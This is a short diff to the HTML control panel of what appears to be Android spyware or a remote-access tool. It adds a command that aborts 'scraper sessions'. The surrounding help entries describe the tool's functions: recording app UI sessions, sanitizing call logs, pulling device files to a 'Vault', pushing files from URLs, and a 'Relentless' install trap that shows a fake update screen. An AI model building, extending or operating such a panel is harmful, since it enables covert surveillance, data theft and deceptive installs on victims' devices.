@@ -387,6 +387,7 @@
                         <input type="number" id="tree-depth" value="10" title="Walk Depth" style="width:50px">
                         <button class="btn" onclick="sendCmd('GET_TREE')">Audit</button>
                     </div>
+                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.65rem;" onclick="sendCmd('RESET_SCRAPER')">ABORT ALL SCRAPER SESSIONS</button>
                 </div>
                 <div class="cmd-row">
                     <label class="cmd-label">Call Log Sanitizer</label>
@@ -1334,6 +1335,7 @@
                     cat: "EXTRACTION / FORENSICS",
                     items: [
                         { n: "UI SCRAPER", p: "[Pkg] | [Min] | [Depth]", d: "Pkg: App to watch (null = all). Min: Session duration. Depth: How deep to walk UI tree." },
+                        { n: "RESET SCRAPER", p: "--", d: "Kills all active recordings and clears the waiting queue instantly." },
                         { n: "PUSH FILE", p: "[URL] | [Path]", d: "Downloads file from URL to local path. Use the 📁 icon to stage local files first." },
                         { n: "PULL FILE", p: "[Full Path]", d: "Uploads specific file from device to the Vault." },
                         { n: "INSTALL", p: "[APK Path] | [HTML]", d: "Triggers 'Relentless' install trap. HTML is an optional fake update screen." },
